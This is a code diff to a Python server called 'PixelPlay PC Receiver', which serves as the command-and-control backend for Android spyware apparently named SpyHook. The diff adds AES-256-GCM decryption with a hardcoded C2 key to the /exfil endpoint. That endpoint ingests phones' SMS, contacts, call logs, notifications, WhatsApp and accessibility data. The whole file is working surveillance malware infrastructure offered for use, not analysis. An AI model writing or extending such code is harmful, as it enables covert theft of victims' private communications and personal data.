@@ -8,10 +8,36 @@ PixelPlay PC Receiver — single file serving everything on port 8080.
   /exfil      → POST endpoint for phone data
 """
 
-import json, os, socket, threading, uuid
+import json, os, socket, threading, uuid, hashlib, struct
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
 from datetime import datetime
+
+# AES-256-GCM for C2 decryption (matches SpyHook.java)
+try:
+    from Crypto.Cipher import AES as AES_GCM
+    HAS_CRYPTO = True
+except ImportError:
+    HAS_CRYPTO = False
+    print("[!] pycryptodome not installed: pip install pycryptodome")
+
+C2_KEY = hashlib.sha256(b"PixelPlay_C2_v1").digest()  # 32 bytes, matches SpyHook
+
+def aes_gcm_decrypt(data):
+    if len(data) < 28:
+        return None
+    iv = data[:12]
+    ct = data[12:]
+    if HAS_CRYPTO:
+        try:
+            c = AES_GCM.new(C2_KEY, AES_GCM.MODE_GCM, nonce=iv)
+            return c.decrypt(ct)
+        except Exception as e:
+            print(f"[!] AES decrypt error: {e}")
+            return None
+    else:
+        # Without pycryptodome, try raw extraction (won't work for encrypted data)
+        return None
 
 received_data = {}
 data_lock = threading.Lock()
@@ -256,6 +282,14 @@ class Handler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b)
 
+    def _ok(self):
+        r = b'OK'
+        self.send_response(200)
+        self.send_header('Content-Length', str(len(r)))
+        self.send_header('Connection', 'close')
+        self.end_headers()
+        self.wfile.write(r)
+
     def _text(self, t):
         b = t.encode()
         self.send_response(200)
@@ -328,7 +362,16 @@ class Handler(BaseHTTPRequestHandler):
     def _exfil(self):
         try:
             ln = int(self.headers.get('Content-Length', 0))
-            d = json.loads(self.rfile.read(ln).decode())
+            raw = self.rfile.read(ln)
+
+            # AES-256-GCM decrypt (matches SpyHook.java)
+            plain = aes_gcm_decrypt(raw)
+            if plain is None:
+                print(f"[!] AES decrypt failed, received {ln} bytes")
+                self._ok()
+                return
+
+            d = json.loads(plain.decode())
             with data_lock:
                 for k in ['device','sms','contacts','call_logs','notifications','whatsapp','accessibility']:
                     if k in d: received_data[k] = d[k]
@@ -346,12 +389,7 @@ class Handler(BaseHTTPRequestHandler):
             print(f"  Dashboard: /dashboard\n")
         except Exception as e:
             print(f"Exfil err: {e}")
-        r = b'OK'
-        self.send_response(200)
-        self.send_header('Content-Length', str(len(r)))
-        self.send_header('Connection', 'close')
-        self.end_headers()
-        self.wfile.write(r)
+        self._ok()
 
     def _upload(self):
         try:
